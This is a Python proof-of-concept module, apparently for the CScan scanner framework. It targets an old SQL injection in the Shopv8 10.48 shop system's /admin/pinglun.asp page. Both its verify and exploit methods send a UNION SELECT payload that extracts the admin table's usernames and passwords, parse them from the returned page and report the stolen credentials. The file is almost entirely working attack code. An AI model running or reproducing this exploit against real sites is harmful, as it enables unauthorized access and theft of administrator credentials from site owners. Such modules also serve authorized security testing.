# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Shopv8_0001'  # 平台漏洞编号，留空
    name = 'Shopv8商城系统 /admin/pinglun.asp SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-04-17'  # 漏洞公布时间
    desc = '''
        Shopv8商城系统是一款Asp商城系统，运行环境支持ASP。
        'ShopV8 10.48 SQL注入漏洞出现在pinglun.asp文件.
    '''  # 漏洞描述
    ref = 'http://www.yunsec.net/a/security/bugs/script/2010/0417/3407.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shopv8商城系统'  # 漏洞应用名称
    product_version = '10.48'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4375a792-dd2d-4c2c-b5f2-2755b49ec130'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,3,4,"
                       "username,password,7,8,9,10,11%20from%20admin")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r'.*?id=[\'"]?pingluntitle[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
                                 # 匹配密码
                                 r'.*?id=[\'"]?pingluncontent[\'"]?.*?>(?P<password>\w+)</textarea>',
                                 re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)
            if match != None:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,3,4,"
                       "username,password,7,8,9,10,11%20from%20admin")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r'.*?id=[\'"]?pingluntitle[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
                                 # 匹配密码
                                 r'.*?id=[\'"]?pingluncontent[\'"]?.*?>(?P<password>\w+)</textarea>',
                                 re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)
            if match != None:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
